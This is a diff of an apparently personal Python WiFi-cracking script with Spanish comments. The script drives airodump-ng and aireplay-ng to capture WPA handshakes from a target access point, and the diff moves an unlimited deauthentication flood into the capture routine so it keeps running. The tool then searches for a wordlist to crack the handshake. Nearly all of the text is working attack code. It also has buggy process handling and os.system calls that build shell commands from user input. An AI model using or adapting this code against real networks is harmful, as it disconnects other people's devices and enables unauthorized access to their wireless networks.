@@ -1,4 +1,5 @@
 #!/bin/python3
+import pywifi as pywifi
 
 try:
     print("\n[*] Starting...")
@@ -21,6 +22,8 @@ except ModuleNotFoundError as e:
     print("[!] Exiting...")
     exit(1)
 
+# Juntar con port_scan
+# Añadir anilisis de WiFis
 
 def delete_files():
     os.system("rm -r captures/* > /dev/null")
@@ -28,8 +31,8 @@ def delete_files():
 
 
 def restart_net():
-    os.system("service networking restart")
-    os.system("service NetworkManager restart")
+    os.system("service networking restart > /dev/null")
+    os.system("service NetworkManager restart > /dev/null")
 # COMPROBAR SI EL ARGUMENTO -w FUNCIONA Y SE COMPRUEBA
 
 
@@ -50,10 +53,9 @@ def exiting(err):
         + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
                         Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
 
-
     try:
-        if os.system("airmon-ng stop {}mon ".format(choosed_interface)) != 0:
-            os.system("airmon-ng stop {}".format(choosed_interface))
+        if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
+            os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
     except NameError:
         pass
 
@@ -339,32 +341,34 @@ def prepare_attack(dict, network_to_attack, args):
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
-    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
-                             f"{interface}"], stdout=subprocess.PIPE)
-
 
     # Preparamos multiproceso para poder pararlos todos a la vez
-    deauth = multiprocessing.Process(target=deauth_clients(bssid))
-    deauth.start()
+    #deauth = multiprocessing.Process(target=deauth_clients(bssid))
+
 
     # Preparamos subproceso de capture hand
-    capture = threading.Thread(target=capture_handshake(hand, direc, args, deauth))
+    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
+    #deauth.start()
 
     # Juntamos para detener
     capture.join()
-    deauth.join()
+    #deauth.join()
 
 
-def deauth_clients(bssid):
+"""def deauth_clients(bssid):
     # Enviar paquetes "deauth"
-    reject = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
+"""
 
 
+def capture_handshake(direc, args, bssid, ch, file):
 
-def capture_handshake(hand,  direc, args, deauth):
+    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
+                             f"{interface}"], stdout=subprocess.PIPE)
+
+    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
     done = False
     while True:
         try:
@@ -373,11 +377,9 @@ def capture_handshake(hand,  direc, args, deauth):
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
-                deauth.terminate()
                 break
 
         except KeyboardInterrupt:
-            deauth.terminate()
             break
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
@@ -390,7 +392,7 @@ def capture_handshake(hand,  direc, args, deauth):
 
 
 def find_wordlists(wordlists):
-    found = os.system("find {}  > /dev/null".format(wordlists))
+    found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
@@ -454,10 +456,9 @@ def main():
     except KeyboardInterrupt:
         exiting(err=False)
 
-    # Salida por error
+    """# Salida por error
     except Exception as e:
-        exiting(err=e)
-
+        exiting(err=e)"""
 
 
 if __name__ == "__main__":
